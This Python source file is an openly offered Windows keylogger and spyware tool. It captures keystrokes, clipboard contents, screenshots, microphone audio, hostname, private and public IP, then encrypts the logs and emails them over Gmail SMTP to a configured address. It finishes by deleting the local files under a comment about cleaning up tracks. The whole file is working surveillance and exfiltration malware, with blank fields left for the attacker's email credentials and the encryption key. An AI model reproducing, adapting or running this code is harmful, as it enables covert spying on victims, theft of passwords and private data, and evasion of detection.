from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt" #the file for saving the keys pressed
system_information = "syseminfo.txt" #the file for saving the system info
clipboard_information = "clipboard.txt" #the file for saving the contents of clipboard
audio_information = "audio.wav" #the name of the file for saving the audio recording
screenshot_information = "screenshot.png" #the name of the file for saving the screenshot

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10 #mentions the duration mic audio will be recorded
time_iteration = 15 #mentions the duration the program will run
number_of_iterations_end = 3

email_address = " " # Enter the sending email here
password = " " # Enter email password here

username = getpass.getuser() #gets the username of the host device

toaddr = "" # Enter the email address you want to send your information to

key = "" # Generate an encryption key by running the GenerateKey.py file from the Cryptography folder and paste its contents

file_path = "" # Enter the file path you want your files to be saved to
extend = "\\"
file_merge = file_path + extend

# email controls
def send_email(filename, attachment, toaddr):

    fromaddr = email_address #sets the provided email address as the sender email

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr #sets the destination email

    msg['Subject'] = "Log File" #sets the subject of the mail

    body = "Body_of_the_mail" #sets a body of the mail

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587) #apparently Gmail uses SMTP Protocol which has this port number, so add this

    s.starttls()

    s.login(fromaddr, password) #loging in

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text) #send mail

    s.quit() #closing the connection

send_email(keys_information, file_path + extend + keys_information, toaddr)

# get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text #gets the IP Address
            f.write("Public IP Address: " + public_ip) 

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n') #gets the Processor
        f.write("System: " + platform.system() + " " + platform.version() + '\n') #gets the OS
        f.write("Machine: " + platform.machine() + "\n") #gets the type of machine, i.e., 64bit or 32bit
        f.write("Hostname: " + hostname + "\n") #the name of the PC
        f.write("Private IP Address: " + IPAddr + "\n") 

computer_information()

# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard() #opens the clipboard
            pasted_data = win32clipboard.GetClipboardData() #gets the content of the clipboard
            win32clipboard.CloseClipboard() #closes the clipboard

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

copy_clipboard()

# get the microphone
def microphone():
    fs = 44100
    seconds = microphone_time #sets the duration of recording

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2) #record the audio
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording) #writes the recording

# get screenshots
def screenshot():
    im = ImageGrab.grab() #takes screenshot
    im.save(file_path + extend + screenshot_information) #saves it in the location

screenshot()


number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys =[]

    def on_press(key):
        global keys, count, currentTime

        print(key) #prints the key pressed on the console
        keys.append(key) #saves that into the file
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0: #saves the contents in a formatted manner
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key): 
        if key == Key.esc: 
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener: #listens to the keys pressed
        listener.join() 

    if currentTime > stoppingTime:

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

# Encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120)

# Clean up our tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)